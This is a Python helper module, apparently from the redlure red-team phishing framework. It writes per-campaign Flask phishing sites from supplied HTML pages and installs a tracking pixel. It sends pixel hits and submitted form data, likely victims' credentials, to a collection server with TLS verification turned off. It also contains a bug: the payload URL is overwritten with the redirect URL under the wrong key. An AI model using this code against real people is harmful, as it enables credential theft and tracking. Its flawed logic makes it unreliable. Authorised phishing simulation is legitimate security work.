#!/usr/bin/env python3
import sys
import os
import requests
from string import Template
from functools import wraps
from flask import request, abort
from shutil import copyfile
sys.path.append('..')
from config import Config
import psutil
from signal import SIGTERM
import json

app_dir = os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir))
configs = Config


def write_to_disk(campaign):
    '''
    Create a Flask app on disk with the data provided by the server
    '''
    # create campaigns folder if it doesnt exist
    if not os.path.isdir(os.path.join(app_dir, 'campaigns')):
        os.mkdir(os.path.join(app_dir, 'campaigns'))
    
    id = str(int(campaign['id']))
    campaign_dir = os.path.join(app_dir, 'campaigns', id)
    
    # create campaign dir
    if not os.path.isdir(campaign_dir):
        os.mkdir(campaign_dir)

    # create basic app folder structure
    if not os.path.isdir(os.path.join(campaign_dir, 'app')):
        os.mkdir(os.path.join(campaign_dir, 'app'))
    if not os.path.isdir(os.path.join(campaign_dir, 'app', 'templates')):
        os.mkdir(os.path.join(campaign_dir, 'app', 'templates'))
    if not os.path.isdir(os.path.join(campaign_dir, 'app', 'static')):
        os.mkdir(os.path.join(campaign_dir, 'app', 'static'))
    copyfile(os.path.join(app_dir, 'templates', 'pixel.png'), os.path.join(campaign_dir, 'app', 'static', 'pixel.png'))

    # copy all files from the upload dir to the static folder
    if os.path.isdir(configs.UPLOAD_FOLDER):
        for file in os.listdir(configs.UPLOAD_FOLDER):
            copyfile(os.path.join(configs.UPLOAD_FOLDER, file), os.path.join(campaign_dir, 'app', 'static', file))

    # create campaigns/<id>/app.py
    with open(os.path.join(campaign_dir, 'app.py'), 'w') as f:
        f.write('#!/usr/bin/env python3\nfrom app import app')

    # create campaigns/<id>/app/__init__.py
    with open(os.path.join(campaign_dir, 'app', '__init__.py'), 'w') as f:
        tmp = open(os.path.join(app_dir, 'templates', '__init__.txt')).read()
        f.write(tmp)

    # value that will be replaced in the routing template
    values = {'base_url': '', 'url1': '', 'url2': '', 'url3': '','url4': '', 'url5': '', 'redirect_url': '', 'payload_url': ''}

    if campaign['ssl']:
        base_url = f'https://{campaign["domain"]["domain"]}:{int(campaign["port"])}'
    else:
        base_url = f'http://{campaign["domain"]["domain"]}:{int(campaign["port"])}'

    values['base_url'] = base_url
    
    if campaign['redirect_url']:
        values['redirect_url'] = campaign['redirect_url']

    if campaign['payload_url']:
        values['payload'] = campaign['redirect_url']

    # create templates in campaigns/<id>/templates
    for idx, page in enumerate(campaign['pages']):
        str_idx = str(idx + 1)
        values['url%s' % str_idx] = page['page']['url']
        template_name = '%s.html' % str_idx
        with open(os.path.join(campaign_dir, 'app', 'templates', template_name), 'w') as f:
            f.write(page['page']['html'])

    # create campaigns/<id>/app/routes.py
    routes_template = Template(open(os.path.join(app_dir, 'templates', 'routes.txt')).read())
    with open(os.path.join(campaign_dir, 'app', 'routes.py'), 'w') as f:
        f.write(routes_template.substitute(values))


def require_api_key(f):
    '''
    Require an API key be provided to a function
    '''
    @wraps(f)
    def wrap(*args, **kwargs):
        if request.args.get('key') and request.args.get('key') == configs.API_KEY:
            return f(*args, **kwargs)
        else:
            abort(401)
    return wrap


def report_action(tracker, action):
    '''
    Report a hit on /static/pixel.png for a target ID to the redlure server
    '''
    url = 'https://%s:%d/results/update' % (configs.SERVER_IP, configs.SERVER_PORT)
    params = {'key': configs.API_KEY}
    payload = {'tracker': tracker, 'action': action}
    try:
        r = requests.post(url, data=payload, params=params, verify=False)
    except:
        pass


def report_form(tracker, form_data):
    '''
    Report a form submission with a target ID to the redlure server
    '''
    print('sending form data')
    data = json.dumps(form_data.to_dict(flat=False))
    url = 'https://%s:%d/results/form' % (configs.SERVER_IP, configs.SERVER_PORT)
    params = {'key': configs.API_KEY}
    payload = {'tracker': tracker, 'data': data}
    try:
        r = requests.post(url, data=payload, params=params, verify=False)
    except:
        pass


def check_procs(port, kill=False):
    '''
    Check if there is a procsess running on a specific port and optionallly, kill it
    '''
    for proc in psutil.process_iter():
        for conns in proc.connections(kind='inet'):
            if conns.laddr.port == port:
                if kill:
                    proc.send_signal(SIGTERM)
                else:
                    return proc


